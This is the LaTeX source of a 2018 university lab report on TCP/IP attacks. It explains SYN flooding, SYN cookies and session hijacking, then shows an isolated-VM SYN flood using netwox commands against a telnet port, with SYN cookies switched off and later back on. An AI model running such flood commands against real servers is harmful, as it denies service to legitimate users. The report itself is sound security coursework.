%\documentclass[12pt,notitlepage]{article}
\documentclass[a4paper,12pt]{article}
\usepackage[utf8]{inputenc}
\usepackage{graphicx}
\usepackage{verbatim}
\usepackage{amsthm}
\usepackage{amssymb}
\usepackage{pdfpages}
\usepackage{amsmath}
\usepackage{tikzsymbols}
\usetikzlibrary{arrows}
\usetikzlibrary{3d}
\newcommand{\midarrow}{\tikz \draw[-triangle 90] (0,0) -- +(.1,0);}
\pgfdeclarelayer{bg}    % declare background layer
\pgfsetlayers{bg,main}  % set the order of the layers (main is the standard layer)
\usepackage{mwe}
\usetikzlibrary{decorations.pathreplacing}
\usetikzlibrary{shapes}
\usepackage{mathtools}
\usepackage{enumitem}
\DeclarePairedDelimiter\ceil{\lceil}{\rceil}
\DeclarePairedDelimiter\floor{\lfloor}{\rfloor}
\usepackage{subcaption}

\usepackage{hyperref}
%\usepackage[T1]{fontenc}
\usepackage{url}
\usepackage{lipsum}
\usepackage{array}
\usepackage{multirow}
\usepackage{float}
\usepackage{lscape}
\usepackage{colortbl}
\newcolumntype{P}[1]{>{\centering\arraybackslash}p{#1}}
\usepackage[nottoc,numbib]{tocbibind}
\usepackage{fancyhdr}
\usepackage{hhline}
\usepackage[printonlyused]{acronym}
\usepackage{footmisc}

%\usepackage{txfonts}
\usepackage{lipsum,etoolbox}% http://ctan.org/pkg/{lipsum,etoolbox}
\usepackage{caption}
\usepackage{subcaption}
\usepackage{setspace}

\usepackage{algorithm}
\usepackage[noend]{algpseudocode}

\makeatletter
\def\BState{\State\hskip-\ALG@thistlm}
\makeatother

\usepackage{minted}

\definecolor{black}{RGB}{0,0,0}

\usepackage{fancyvrb}

\usepackage{geometry}
\geometry{
	a4paper,
	total={170mm,257mm},
	right=3cm,
	left=3cm,
	top=3cm,
	bottom=3cm
}



\makeatletter
\DeclareRobustCommand{\rvdots}{%
	\vbox{
		\baselineskip4\p@\lineskiplimit\z@
		\kern-\p@
		\hbox{.}\hbox{.}\hbox{.}
}}
\makeatother
\usepackage{titlesec}
\usepackage{hyperref}
\titleclass{\subsubsubsection}{straight}[\subsection]

\newcounter{subsubsubsection}[subsubsection]
\renewcommand\thesubsubsubsection{\thesubsubsection.\arabic{subsubsubsection}}
\renewcommand\theparagraph{\thesubsubsubsection.\arabic{paragraph}} % optional; useful if paragraphs are to be numbered

\titleformat{\subsubsubsection}
{\normalfont\normalsize\bfseries}{\thesubsubsubsection}{1em}{}
\titlespacing*{\subsubsubsection}
{0pt}{3.25ex plus 1ex minus .2ex}{1.5ex plus .2ex}

\makeatletter
\renewcommand\paragraph{\@startsection{paragraph}{5}{\z@}%
	{3.25ex \@plus1ex \@minus.2ex}%
	{-1em}%
	{\normalfont\normalsize\bfseries}}
\renewcommand\subparagraph{\@startsection{subparagraph}{6}{\parindent}%
	{3.25ex \@plus1ex \@minus .2ex}%
	{-1em}%
	{\normalfont\normalsize\bfseries}}
\def\toclevel@subsubsubsection{4}
\def\toclevel@paragraph{5}
\def\toclevel@paragraph{6}
\def\l@subsubsubsection{\@dottedtocline{4}{7em}{4em}}
\def\l@paragraph{\@dottedtocline{5}{10em}{5em}}
\def\l@subparagraph{\@dottedtocline{6}{14em}{6em}}
\makeatother
\newcommand*\circled[1]{\tikz[baseline=(char.base)]{
		\node[shape=circle,draw,inner sep=2pt] (char) {#1};}}


\setcounter{secnumdepth}{4}
\setcounter{tocdepth}{4}
\newcommand{\und}{\underline{\hspace{.10in}}}

\begin{document}
	\begin{titlepage}
		\begin{center}
			\includegraphics[width = \textwidth]{logo_ntu_new.png}
			\vspace*{7em}
			
			
			\Huge MH4921:\\Supervised Independent Study II\\		
			\LARGE
			\vspace{2cm}
			\textbf{By\\ Brandon Goh Wen Heng}\\\vspace{2cm}
			Supervisor: Assoc Prof Wu Hongjun
			\\\vspace{2cm}August 2018\\
			Academic Year 18/19\\\vspace{1.2cm}
			
			\vfill
		\end{center}
	\end{titlepage}




%PDF 1: TCP/IP Attacks%
\begin{titlepage}
		\begin{center}
		\vspace*{27em}
		\Huge
			\textbf{TCP/IP Attack}\\		
			\vfill
		\end{center}
	\end{titlepage}
	
	\pagenumbering{roman}
	\newpage
	\pagenumbering{arabic}
	\section{Introduction}
	A connection between two systems requires sending and receiving of three packets, namely \texttt{SYN}, \texttt{SYN+ACK} and \texttt{ACK} packets. \texttt{SYN} is an acronym for \textit{Synchronise} and is used to indicate that the system is attempting to initiate a new TCP session while \texttt{ACK} is the acronym for \textit{Acknowledgement}, to indicate that the endpoint has received the relevant data. For a connection to be established, the client initiates the request by sending a \texttt{SYN} packet. The server will reply with a \texttt{SYN+ACK} packet to the client and the client will likewise respond with the last \texttt{ACK} packet. During the period between the server receiving the \texttt{SYN} packet and the \texttt{ACK} packet, the operating system will maintain a queue with all the SYN entries that it is awaiting an \texttt{ACK} packet from. This queue is also known as the SYN queue and the size may vary, depending on the configuration of the server. Figure \ref{fig:TCPHandshake} shows in graphical form how systems establish a connection using the TCP protocol.
		\begin{figure}[!h]
		\centering
	\begin{tikzpicture}
	\draw[fill=blue!10] (-2.15,1.15) rectangle (-0.85,0.25);
	\draw (-2.3,1.3) rectangle (-0.7,0.1);
	\draw (-1.1,0.1) rectangle (-1.9,-0.4);
	\draw (-2.1,-0.25) -- (-2.5,-0.6);
	\draw (-0.9,-0.25) -- (-0.5,-0.6);
	\draw (-2.5,-0.6) -- (-0.5,-0.6);
	\draw (-2.1,-0.25) -- (-1.9,-0.25);
	\draw (-0.9,-0.25) -- (-1.1,-0.25);
	\draw (-1.5,-1) node{Client};
	
	\draw (0, 3) -- (0,-2);
	\draw (4, 3) -- (4,-2);
	
	\draw[fill=green!10] (4.85,1.15) rectangle (6.15,0.25);
	\draw (4.7,1.3) rectangle (6.3,0.1);
	\draw (5.9,0.1) rectangle (5.1,-0.4);
	\draw (4.9,-0.25) -- (4.5,-0.6);
	\draw (6.1,-0.25) -- (6.5,-0.6);
	\draw (4.5,-0.6) -- (6.5,-0.6);
	\draw (4.9,-0.25) -- (5.1,-0.25);
	\draw (6.1,-0.25) -- (5.9,-0.25);
	\draw (5.5,-1) node{Server};
	
	\draw[->,>=stealth',line width=0.4mm] (0,2.6) -- (4,1.9);
	\draw (2,2.3) node[rotate=-11,yshift=0.2cm]{SYN};
	
	\draw[->,>=stealth',line width=0.4mm] (4,1.4) -- (0,0.7);
	\draw (2,1.1) node[rotate=11,yshift=0.2cm]{SYN+ACK};
	
	\draw[->,>=stealth',line width=0.4mm] (0,0.2) -- (4,-0.5);
	\draw (2,-0.1) node[rotate=-11,yshift=0.2cm]{ACK};
	
	\draw[line width=0.4mm] (0,-1.6) -- (4,-1.6);
	\draw (2,-1.6) node[xshift=0.5cm,yshift=0cm,text width=3cm]{Connection\\Established};
	\draw[fill=black] (0,-1.6) circle (1mm);
	\draw[fill=black] (4,-1.6) circle (1mm);
	
	\draw[->,>=stealth',line width=0.4mm] (8.1,3) -- (8.1,-2);
	\draw (8.8,0.5) node [xshift=0.5mm]{Time};
	\end{tikzpicture}
		\caption{Normal 3-step TCP Handshake}
		\label{fig:TCPHandshake}
\end{figure}
\\
When an attacker performs Denial-of-Service Attack (DoS Attack) or Distributed Denial-of-Service Attack (DDoS),  a common methodology is to use SYN flooding. This method involves the mass transmission of TCP packets with spoofed IP Addresses, leading the server to wait for \texttt{ACK} responses from multiple non-existent parties. While the server waits for these \texttt{ACK} responses, the server is unable to process any new requests until the old requests timeout. This congests the SYN queue and prevents new SYN requests from being processed. This significantly increases the response time of the server and prevents any legitimate clients from connecting to the server(s) resources. Figure \ref{fig:TCPHandshakeDOS} depicts the sequence for a SYN flooding attack.
		\begin{figure}[H]
	\centering
	\begin{tikzpicture}
	\draw[fill=red!10] (-2.15,2.15) rectangle (-0.85,1.25);
	\draw (-2.3,2.3) rectangle (-0.7,1.1);
	\draw (-1.1,1.1) rectangle (-1.9,0.6);
	\draw (-2.1,0.75) -- (-2.5,0.4);
	\draw (-0.9,0.75) -- (-0.5,0.4);
	\draw (-2.5,0.4) -- (-0.5,0.4);
	\draw (-2.1,0.75) -- (-1.9,0.75);
	\draw (-0.9,0.75) -- (-1.1,0.75);
	\draw (-1.5,0) node{Attacker};
	
	
	\draw[fill=blue!10] (-5.15,2.15) rectangle (-3.85,1.25);
\draw (-5.3,2.3) rectangle (-3.7,1.1);
\draw (-4.1,1.1) rectangle (-4.9,0.6);
\draw (-5.1,0.75) -- (-5.5,0.4);
\draw (-3.9,0.75) -- (-3.5,0.4);
\draw (-5.5,0.4) -- (-3.5,0.4);
\draw (-5.1,0.75) -- (-4.9,0.75);
\draw (-3.9,0.75) -- (-4.1,0.75);
	\draw (-4.5,0) node{User};
	
	\draw (-4.45, -0.6) -- (-4.45,-8);
	\draw (-1.45, -0.6) -- (-1.45,-2.7);
	\draw (-1.45, -4.9) -- (-1.45,-6.1);
	\draw (-1.45, -7.35) -- (-1.45,-8);
	\draw (3.78, -0.6) -- (3.78,-8);
	
	\draw[fill=green!10] (3.05,2.15) rectangle (4.35,1.25);
	\draw (2.9,2.3) rectangle (4.5,1.1);
	\draw (4.1,1.1) rectangle (3.3,0.6);
	\draw (3.1,0.75) -- (2.7,0.4);
	\draw (4.3,0.75) -- (4.7,0.4);
	\draw (2.7,0.4) -- (4.7,0.4);
	\draw (3.1,0.75) -- (3.3,0.75);
	\draw (4.3,0.75) -- (4.1,0.75);
	\draw (3.7 ,0) node{Server};
	
	\draw[->,>=stealth',line width=0.4mm] (-1.45,-0.8) -- (3.78,-1.1);
	\draw[->,>=stealth',line width=0.4mm] (-1.45,-1.05) -- (3.78,-1.35);
	\draw[->,>=stealth',line width=0.4mm] (-1.45,-1.3) -- (3.78,-1.6);
	\draw[->,>=stealth',line width=0.4mm] (-1.45,-1.55) -- (3.78,-1.85);
	\draw[->,>=stealth',line width=0.4mm] (-1.45,-1.8) -- (3.78,-2.1);
	\draw[->,>=stealth',line width=0.4mm] (-1.45,-2.05) -- (3.78,-2.35);
	\draw (1.17,-0.68) node[rotate=-2]{SYN};
	
	\draw[densely dotted,line width=0.4mm] (3.78,-1.1) -- (5.2,-0.8);
	\draw[densely dotted, line width=0.4mm](3.78,-2.35) -- (5.2,-6);
	\draw(5.2,-0.8) -- (5.2,-6);
	\draw (8,-0.8) -- (8,-6);
	\draw (5.2, -4.6) rectangle node[text width=2.4cm] {\small{IP Address 1\\SYN\_RECV}} (8,-5.7);
	\draw (5.2, -3.5) rectangle node[text width=2.4cm] {\small{IP Address 2\\SYN\_RECV}} (8,-4.6);
	\draw (5.2, -1.1) rectangle node[text width=2.4cm] {\small{IP Address $x$\\SYN\_RECV}} (8,-2.2);
	\draw (5.2, -2.2) rectangle node[rotate=90] {$\cdots$}(8,-3.5);
	\draw (6.62,-6.8) node[align=center,text width=3cm] {Full SYN Queue\\on Server};
	
	\draw[->,>=stealth',line width=0.4mm] (3.78,-3) -- (0.2,-3.2);
	\draw[->,>=stealth',line width=0.4mm] (3.78,-3.25) -- (0.59,-3.45);
	\draw[->,>=stealth',line width=0.4mm] (3.78,-3.5) -- (0.68,-3.7);
	\draw[->,>=stealth',line width=0.4mm] (3.78,-3.75) -- (0.68,-3.95);
	\draw[->,>=stealth',line width=0.4mm] (3.78,-4) -- (0.55,-4.2);
	\draw[->,>=stealth',line width=0.4mm] (3.78,-4.25) -- (0.16,-4.45);
	\node[cloud, draw,cloud puffs=10,cloud puff arc=130, aspect=3, inner ysep=0.1cm, inner xsep=0.1cm, text width=2.4cm,align=center] at (-1.45,-3.8)  {Spoofed\\IP Addresses} ;
	\draw (2.07,-3.05) node[rotate=2,yshift=0.2cm]{SYN+ACK};
	
	\draw[->,>=stealth',line width=0.4mm] (-4.45,-5.2) -- (3.78,-5.9);
	\draw (-0.335,-5.55) node[rotate=-5,yshift=0.25cm]{SYN};
	
	
	\draw[->,>=stealth',densely dotted] (3.78,-6.6) -- (-4.45,-6.9);
	\draw (0.3,-6.76) node[rotate=2,text width=5cm]{No SYN+ACK transmitted \\as SYN queue full};
	\draw (-2.7,-6.84) node[rotate=2]{\LARGE \color{red}\textbf{$\times$}};
	
	
	\end{tikzpicture}
	\caption{3-step TCP Handshake disrupted during SYN flooding}
	\label{fig:TCPHandshakeDOS}
\end{figure}
\noindent \\However, there exists different methods to mitigate SYN flooding attacks. For the current report, the focus will be on the technique involving SYN cookies. With the enabling of this feature, the server will be made to think that the SYN queue has been enlarged (beyond its declared value) as each \texttt{SYN+ACK} and \texttt{ACK} packets will now be sent with additional data that has been encoded within the TCP packet, specifically the TCP sequence number. This TCP sequence number allows the server to recontruct the SYN request and as such does not require the server to maintain the same SYN queue state and frees up the queue for new SYN requests from other clients to be processed. The mathematical implementation has been omitted for simplicity.\\\\Other network attacks that can be implemented include TCP session hijacking, where an attacker injects a carefully crafted TCP packet containing  malicious code to take over or cripple an entire system. Figure \ref{fig:SessionHijacking} depicts a simplified graphical sequence on how the attack is executed.
		\begin{figure}[H]
	\centering
	\begin{tikzpicture}
	\draw[fill=red!10] (-2.15,2.15) rectangle (-0.85,1.25);
	\draw (-2.3,2.3) rectangle (-0.7,1.1);
	\draw (-1.1,1.1) rectangle (-1.9,0.6);
	\draw (-2.1,0.75) -- (-2.5,0.4);
	\draw (-0.9,0.75) -- (-0.5,0.4);
	\draw (-2.5,0.4) -- (-0.5,0.4);
	\draw (-2.1,0.75) -- (-1.9,0.75);
	\draw (-0.9,0.75) -- (-1.1,0.75);
	\draw (-1.5,0) node{Attacker};
	
	
	\draw[fill=blue!10] (-5.15,2.15) rectangle (-3.85,1.25);
	\draw (-5.3,2.3) rectangle (-3.7,1.1);
	\draw (-4.1,1.1) rectangle (-4.9,0.6);
	\draw (-5.1,0.75) -- (-5.5,0.4);
	\draw (-3.9,0.75) -- (-3.5,0.4);
	\draw (-5.5,0.4) -- (-3.5,0.4);
	\draw (-5.1,0.75) -- (-4.9,0.75);
	\draw (-3.9,0.75) -- (-4.1,0.75);
	\draw (-4.5,0) node{User};
	
	\draw (-4.45, -0.6) -- (-4.45,-11);
	\draw (-1.45, -8) -- (-1.45,-11);
	\draw (7.78, -0.6) -- (7.78,-11);
	
	\draw[fill=green!10] (7.05,2.15) rectangle (8.35,1.25);
	\draw (6.9,2.3) rectangle (8.5,1.1);
	\draw (8.1,1.1) rectangle (7.3,0.6);
	\draw (7.1,0.75) -- (6.7,0.4);
	\draw (8.3,0.75) -- (8.7,0.4);
	\draw (6.7,0.4) -- (8.7,0.4);
	\draw (7.1,0.75) -- (7.3,0.75);
	\draw (8.3,0.75) -- (8.1,0.75);
	\draw (7.7 ,0) node{Server};
	
	\draw[->,>=stealth',line width=0.4mm] (-4.45,-1.6) -- (7.78,-1.6);
	\draw (1,-1.3) node[text width=10cm]{Sequence Number $x$};

	\draw[->,>=stealth',line width=0.4mm] (7.78,-3.1) -- (-4.45,-3.1);
	\draw (4.55,-2.58) node[align=right,text width=5.8cm]{Sequence Number $y$\\Acknowledgement Number $x+1$};
	
	\draw[->,>=stealth',line width=0.4mm] (-4.45,-4.6) -- (7.78,-4.6);
	\draw (-1,-4.08) node[text width=6cm]{Sequence Number $x+1$\\Acknowledgement Number $y+1$};
	
	\draw[->,>=stealth',line width=0.4mm] (-4.45,-6.1) -- (7.78,-6.1);
	\draw (-0.97,-5.45) node[text width=6cm]{Data:};
	\draw (0.21,-5.58) node[align=left,text width=5.8cm]{Sequence Number $x$$+$$1$ \\Acknowledgement Number $y+1$};
	
		\draw[<-,>=stealth',line width=0.4mm] (-4.45,-7.6) -- (7.78,-7.6);
	\draw (2.9,-6.95) node[text width=6cm]{Data:};
	\draw (4.21,-7.08) node[text width=6.5cm,align=right]{Sequence Number $y$$+$$1$ \\Acknowledgement Number $x$$+$$1$$+$$\alpha$};
	
		\draw[->,>=stealth',line width=0.4mm] (-1.45,-9.1) -- (7.78,-9.1);
	\draw (1.7,-8.57) node[text width=6cm]{\color{red} Spoofed:};
	\draw (3.7,-8.58) node[align=left,text width=6.5cm]{Sequence Number $x$$+$$1$$+$$\alpha$ \\Acknowledgement Number $y$$+$$1$$+$$\beta$};
	
	\draw[<-,>=stealth',line width=0.4mm] (-1.45,-10.6) -- (7.78,-10.6);
	\draw (2.5,-9.95) node[text width=6cm]{Data:};
	\draw (3.98,-10.08) node[text width=7cm,align=right]{Sequence Number $y$$+$$1$$+$$\beta$ \\Acknowledgement Number $x$$+$$1$$+$$\alpha$$+$$\varepsilon$};
	
	
	\end{tikzpicture}
	\caption{TCP Session Hijacking Process}
	\label{fig:SessionHijacking}
\end{figure}
\noindent Note: $x,y$ are arbitrary positive numbers that the system assigns to the packets while $\alpha,\beta,\varepsilon$ are some positive numbers, dependent on the size of the previously transmitted data packet.
	\section{Overview}
	\begin{par}
		This report highlights vulnerabilities present in the TCP/IP protocols and focuses on implementing common attacks such as DoS Attacks using SYN flooding techniques, TCP reset attacks and TCP session hijacking attacks. Understanding the reasons will allow users to avoid repeating the same mistakes that could result in costly maintenance and recovery.\\\\The report is structured as follows, the first task will involve SYN flooding attacks, to prevent the system from accepting and processing legitimate requests. Countermeasures against this form of attack will also be examined and how these measures will alleviate the current problems. Next, TCP RST Attacks on \texttt{telnet} and \texttt{ssh} connections will be examined. This attack is disruptive to any endpoint and will force any connection to be broken and prevents it from being established while the attack is in effect. It will be extended to real-world use where a (simulated) video-sharing site will be tested against this attack. The last part will look at TCP session hijacking, where packets can be carefully crafted to execute arbitrary code on the server while hiding one's identity.
		\end{par}
	\section{Definition\protect\footnote{\href{https://tools.ietf.org/html/rfc1594}{RFC 1594}}}
	\begin{enumerate}
		\item \textbf{Datagram}
		\begin{par}A self-contained, independent entity of data carrying sufficient information to be routed from the source to the destination computer without reliance on earlier exchanges between this source and destination computer and the transporting network. \textit{i.e., datagrams are transmitted between two points without any guarantee of delivery nor notification to the sender.}
		\end{par}
	\item \textbf{Packet}
	\begin{par}The unit of data sent across a network. "Packet" a generic term used to describe unit of data at all levels of the protocol stack, but it is most correctly used to describe application data units.\\\\For simplicity in this paper, the meaning of a network packet is assumed for both \textit{Datagrams} and \textit{Packets}.\end{par}
\item \texttt{Netstat\protect\footnote{\href{https://linux.die.net/man/8/netstat}{Linux man page - netstat}}}
\begin{par}
	\textbf{Net}work \textbf{stat}istics is a command-line utility that displays network connections, routing tables, interface statistics, masquerade connections and multicast memberships. This utility is available on Unix systems and Windows-NT based operating systems.\\\\On Linux, \texttt{netstat} is superseded by \texttt{ss} in the newer distributions and the switches \texttt{-r}, \texttt{-i}, \texttt{-g} have been replaced by the commands \texttt{ip route}, \texttt{ip -s link} and \texttt{ip maddr} respectively.\\\\For this report, \texttt{netstat -an} is frequently used and each state has been defined below for convenience.
	\end{par}
\begin{enumerate}
	\item \texttt{ESTABLISHED}
	\begin{par}
		The socket has an established connection.
		\end{par}
		\item \texttt{SYN\_SENT}
		\begin{par}
			The socket is actively attempting to establish a connection.
			\end{par}
		\item \texttt{SYN\_RECV}
		\begin{par}
			A connection request has been received from the network.
			\end{par}
		\item \texttt{FIN\_WAIT1}
		\begin{par}
			The socket is closed, and the connection is shutting down.
			\end{par}
		\item \texttt{FIN\_WAIT2}
		\begin{par}
			Connection is closed, and the socket is waiting for a shutdown from the remote end
			\end{par}
		\item \texttt{TIME\_WAIT}
		\begin{par}
			The socket is waiting after close to handle packets still in the network.
			\end{par}
			\item \texttt{CLOSED}
			\begin{par}
				The socket is not being used.
				\end{par}
			\item \texttt{CLOSE\_WAIT}
			\begin{par}
				The remote end has shut down, waiting for the socket to close.
				\end{par}
			\item {\texttt{LAST\_ACK}}
			\begin{par}
				The remote end has shut down, and the socket is closed. Waiting for acknowledgement.
				\end{par}
			\item \texttt{LISTEN}
			\begin{par}
				The socket is listening for incoming connections. Such sockets are not included in the output unless you specify the \texttt{--listening} or (\texttt{-l}) or \texttt{--all} or (\texttt{-a}) option.
				\end{par}
			\item \texttt{CLOSING}
			\begin{par}
				Both sockets are shut down but we still don't have all our data sent.
				\end{par}
			\item \texttt{UNKNOWN}
			\begin{par}
				The state of the socket is unknown.
				\end{par}
\end{enumerate}\end{enumerate}
	\newpage
	\section{Attack Sequence}
	\subsection{Virtual Machine (VM) Preparation}
	\vspace{1em}
	\begin{enumerate}
		\item{\textbf{Network Setup}}
		\begin{par}3 VMs are deployed to the same network using the provided Ubuntu 12.04 image. This network is isolated from the internet to prevent the generated packets from flooding the network card of the physical machine and the wider internet. The topography of the network with the respective IP addresses are reflected in Figure \ref{fig:Networksetup}.\end{par}
				\begin{figure}[H]
			\centering
			\begin{tikzpicture}
			\draw[fill=red!10] (-1.05,2.15) rectangle (0.25,1.25);
			\draw (-1.2,2.3) rectangle (0.4,1.1);
			\draw (0,1.1) rectangle (-0.8,0.6);
			\draw (-1,0.75) -- (-1.4,0.4);
			\draw (0.2,0.75) -- (0.6,0.4);
			\draw (-1.4,0.4) -- (0.6,0.4);
			\draw (-1,0.75) -- (-0.8,0.75);
			\draw (0.2,0.75) -- (0,0.75);
			\draw (-0.4,-0.3) node[text width=3cm,align=center]{Attacker\\192.168.43.156};
			
			
			\draw[fill=blue!10] (-5.15,2.15) rectangle (-3.85,1.25);
			\draw (-5.3,2.3) rectangle (-3.7,1.1);
			\draw (-4.1,1.1) rectangle (-4.9,0.6);
			\draw (-5.1,0.75) -- (-5.5,0.4);
			\draw (-3.9,0.75) -- (-3.5,0.4);
			\draw (-5.5,0.4) -- (-3.5,0.4);
			\draw (-5.1,0.75) -- (-4.9,0.75);
			\draw (-3.9,0.75) -- (-4.1,0.75);
			\draw (-4.5,-0.3) node[text width=3cm, align=center]{User\\192.168.43.154};
			
				\draw[fill=green!10] (3.05,2.15) rectangle (4.35,1.25);
			\draw (2.9,2.3) rectangle (4.5,1.1);
			\draw (4.1,1.1) rectangle (3.3,0.6);
			\draw (3.1,0.75) -- (2.7,0.4);
			\draw (4.3,0.75) -- (4.7,0.4);
			\draw (2.7,0.4) -- (4.7,0.4);
			\draw (3.1,0.75) -- (3.3,0.75);
			\draw (4.3,0.75) -- (4.1,0.75);
			\draw (3.7 ,-0.3) node[text width=3cm, align=center]{Server\\192.168.43.157};
			
			\draw (3.7,-0.8) -- (3.7,-2.4);
			\draw (-4.5,-0.8) -- (-4.5,-2.4);
			\draw (-0.4,-0.8) -- (-0.4,-3.7);
			\draw (3.7,-2.4) -- (0.4,-3.95);
			\draw (-4.5,-2.4)--(-1.2,-3.95);
			\draw[densely dotted, line width=0.3mm](-4.5,-1.5) -- (3.7,-1.5);
			
			
			\draw[fill=yellow!10] (-1.05,-3.85) rectangle (0.25,-4.75);
			\draw (-1.2,-3.7) rectangle (0.4,-4.9);
			\draw (0,-4.9) rectangle (-0.8,-5.4);
			\draw (-1,-5.25) -- (-1.4,-5.6);
			\draw (0.2,-5.25) -- (0.6,-5.6);
			\draw (-1.4,-5.6) -- (0.6,-5.6);
			\draw (-1,-5.25) -- (-0.8,-5.25);
			\draw (0.2,-5.25) -- (0,-5.25);
			\draw (-0.4,-6.3) node[text width=3cm,align=center]{Gateway\\192.168.43.2};
				\end{tikzpicture}
			\caption{Network Configuration}
			\label{fig:Networksetup}
		\end{figure}
			
		\item{\textbf{Starting relevant services}}
		\begin{par}
		To start the services required for this lab, the following command must be executed in Terminal with \texttt{root} privileges.
		\begin{verbatim}
		# service vsftpd start; service openbsd-inetd start
		\end{verbatim}
		Either of the following messages must appear in Terminal to ensure the successful operation of the attacks performed in the following sections.
		\end{par}
		\begin{enumerate}
			\item
			\begin{par}
		\end{par}
		\begin{verbatim}
		start: Job is already running: vsftpd
		 * Starting internet superserver inetd                [OK]
		\end{verbatim}
		\item
		\begin{par}
		\begin{verbatim}
		vsftpd start/running, process 20727
		 * Starting internet superserver inetd                [OK]
		\end{verbatim}
		\end{par}
	\end{enumerate}
\end{enumerate}
	\subsection{SYN Flood Attack}
	It is assumed that the IP address of the server is not known. In this instance \texttt{netwox} can be used to sniff out the addresses. The following command sniffs packets and displays the protocol used and the IP address of the sender.
	\begin{verbatim}
	# netwox 8 --device "Eth0"
	\end{verbatim}
	\vspace{1em}The results from the execution of the command are displayed below.
	\begin{verbatim}
	UDP	    192.168.43.255      138
	UDP	    239.255.255.250     1900
	UDP	    192.168.43.157      42734
	UDP	    192.168.43.2        53
	\end{verbatim}
	*Duplicate lines have been omitted for simplicity\\\\When the lines are analysed, the IP Address\begin{enumerate}
		\item 192.168.43.255 is a broadcast address where all  systems on the network uses it to receive NetBIOS datagrams through UDP port 138. xxx.xxx.xxx.255 is a common broadcast address over networks.
		\item 239.255.255.250 with UDP port 1900 is assigned to the \textit{Simple Service Discovery Protocol (SSDP)}, used for the discovery of Universal Plug and Play (UPnP) devices.
		\item 192.168.43.2 with port 53 is assigned to the \textit{Domain Name System (DNS)}, where domain name endpoints are mapped to the respective system IP addresses.
		\item 192.168.43.157 with port 42734 is not officially assigned to any function or program.
	\end{enumerate}
It is also widely known that UDP ports 53, 138 and 1900 are officially assigned by the Internet Assigned Numbers Authority (IANA) and are not related to the \texttt{vsftpd} and \texttt{telnet} services that were previously started. \\\\Furthermore, to check the gateway address, we can use the following command in Terminal.
\begin{verbatim}
# route -n
\end{verbatim}
\vspace{1em} The output will state clearly the address of the network gateway.
\begin{verbatim}
Destination   Gateway       Genmask       Flags Metric Ref Use Iface
0.0.0.0       192.168.43.2  0.0.0.0       UG    0      0     0 eth0
169.254.0.0   0.0.0.0       255.255.0.0   U     1000   0     0 eth0
192.168.43.0  0.0.0.0       255.255.255.0 U     1      0     0 eth0
\end{verbatim}
\vspace{1em}From the output it can clear that the server has IP address 192.168.43.157.\\\\We will also need to know the queue size on the server to know the number of connections that the server can respond to at any one time. To do so, the following Terminal command will display the queue size.
\begin{verbatim}
# sysctl -q net.ipv4.tcp_max_syn_backlog
\end{verbatim}
The default SYN queue size for the linux virtual machine is 128.\\\\
Before starting the attack, the number of \texttt{SYN\_RECV} is checked to ensure that the number of open connections subsequently is not due to any existing open sockets.
\\\\To print the number of connections, instead of the full details, the following command is used.
\begin{verbatim}
# netstat -an | grep SYN_RECV | wc -l
\end{verbatim}
\begin{figure}[H]
	\centering
	\includegraphics[width=1\linewidth]{SYSRECVBefore}
	\caption{No \texttt{SYN\_RECV} connections before attack}
	\label{fig:sysrecvbefore}
\end{figure}
\noindent An additional step is to disable the SYN cookie counter-mechanism and it can be done with the following line.
\begin{verbatim}
# sysctl -w net.ipv4.tcp_syncookies=0
\end{verbatim}
To start the TCP attack, \texttt{netwox} tool 76 can be used. As \texttt{netwox} is a command-line utility, it may not be convenient for novice users. In this instance, \texttt{netwag} can be used to generate the code needed for execution in \texttt{Terminal}.
\\\\We know that we want to saturate the telnet port (TCP 23) with SYN requests. And since the IP address of the server have been previously known, we can use the following command to flood the server with SYN requests.
\begin{verbatim}
# netwox 76 -i 192.168.43.157 -p 23
\end{verbatim}
On the server, the number of \texttt{SYN\_RECV} requests are recorded, again by using the \texttt{netstat} command as mentioned above. This time, it can be noted that there is a large number of connections currently in the \texttt{SYN\_RECV} stage and are awaiting an \texttt{ACK} from non-existent endpoints.
\begin{figure}[H]
	\centering
	\includegraphics[width=1\linewidth]{SYSRECVAfter}
	\caption{Large number of \texttt{SYN\_RECV} requests}
	\label{fig:sysrecvafter}
\end{figure}
\noindent Furthermore, if we were to remove the ``\texttt{| wc -l}" switch, we will notice the different connections that the system is currently awaiting an \texttt{ACK} signal from.
\begin{figure}[H]
	\centering
	\includegraphics[width=1\linewidth]{SYNRECVlist}
	\caption{List of \texttt{SYN\_RECV} connections}
	\label{fig:synrecvlist}
\end{figure}
\noindent During the SYN flooding attack, if a legitimate user were to connect to the server, the server will not be able to process any new SYN requests and any attempt to connect to the server will eventually timeout as Figure \ref{fig:telnettimeout} has shown.
\begin{figure}[H]
	\centering
	\includegraphics[width=1\linewidth]{telnettimeout}
	\caption{Timeout using \texttt{telnet}}
	\label{fig:telnettimeout}
\end{figure}
\noindent From the server, we can analyse the packets using Wireshark. The tool when run on the server, will analyse all packets that is being transmitted and received from the respective network interface.
\begin{figure}[H]
	\centering
	\includegraphics[width=0.9\linewidth]{PacketAnalysis}
	\caption{Packet Analysis in Wireshark (\texttt{SYN\_RECV})}
	\label{fig:packetanalysis}
\end{figure}
\noindent Referring to Figure \ref{fig:packetanalysis}, we notice that packets being sent from the attacker's system has the source IP generated randomly, with the intention of opening half-opened connections without closing it. Furthermore, since the virtual machine is connected to the internet, there may be a case where there might be an \texttt{ACK} from a connection. The bulk of it however will not receive an \texttt{ACK} signal and force the system to maintain the \texttt{SYN\_RECV} signal. Again referring to Figure  \ref{fig:packetanalysis}, on the bottom right we notice that the number of SYN packets that was sent totalled to 266936, out of the 268003 packets that was captured (99.6\%). 
\begin{figure}[H]
	\centering
	\includegraphics[width=0.9\linewidth]{PacketAnalysis2}
	\caption{Packet Analysis in Wireshark (\texttt{ACK})}
	\label{fig:packetanalysis2}
\end{figure}
\noindent In contrast, the number of packets received with the \texttt{ACK} signal was 1328 (0.5\%). The number may also be lower as other programs running in the background may be connecting to legitimate services.
\\\\Current methods to prevent a SYN flooding attack may include increasing the size of the SYN queue or enabling the SYN cookie option. To perform the latter, the following command must be executed in a privileged \texttt{Terminal}.
\begin{verbatim}
# sysctl -w net.ipv4.tcp_syncookies=1
\end{verbatim}
If the attack is performed again with the SYN cookie enabled, we note that the number of \texttt{SYN\_RECV} connections (256) is larger than the size of the SYN queue (128).
\begin{figure}[H]
	\centering
	\includegraphics[width=1\linewidth]{SYNRECVCookieon}
	\caption{Number of \texttt{SYN\_RECV} entries}
	\label{fig:synrecvcookieon}
\end{figure}
